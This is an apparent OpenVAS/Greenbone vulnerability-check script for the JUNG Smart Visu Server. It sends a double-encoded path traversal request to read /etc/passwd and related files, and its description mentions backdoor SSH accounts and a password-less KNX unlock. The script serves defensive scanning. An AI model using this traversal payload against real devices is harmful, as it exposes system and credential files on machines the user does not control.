if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106577" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2017-02-08 12:16:13 +0700 (Wed, 08 Feb 2017)" );
	script_tag( name: "cvss_base", value: "9.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:N" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "JUNG Smart Visu Server Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "JUNG Smart Visu Server is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Tries to obtain /etc/passwd." );
	script_tag( name: "insight", value: "JUNG Smart Visu Server is prone to multiple vulnerabilities:

  - Path Traversal Vulnerability: The Smart Visu Server runs with root privileges and is vulnerable to path
  traversal. This leads to full information disclosure of all files on the system.

  - Backdoor Accounts: Two undocumented operating system user accounts are present on the appliance. They can be
  used to gain access to the Smart Visu Server via SSH.

  - Group Address (GA) unlock without Password: As protection functionality, the KNX group address can be locked
  with a user-defined password. This password can be removed by using a single PUT request. An attacker can
  completely change the configuration of the connected devices (e.g. a light switch in the kitchen can be swapped
  with the air conditioner)." );
	script_tag( name: "solution", value: "Upgrade to firmware version 1.0.900 or newer." );
	script_xref( name: "URL", value: "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20170207_JUNG_Smart_Visu_Server_Multiple_vulnerabilities_v10.txt" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
res = http_get_cache( port: port, item: "/start/index" );
if(!ContainsString( res, "<title>JUNG - Smart Visu Server</title>" )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/SV-Home//..%252f..%252f..%252f..%252f..%252f..%252f" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

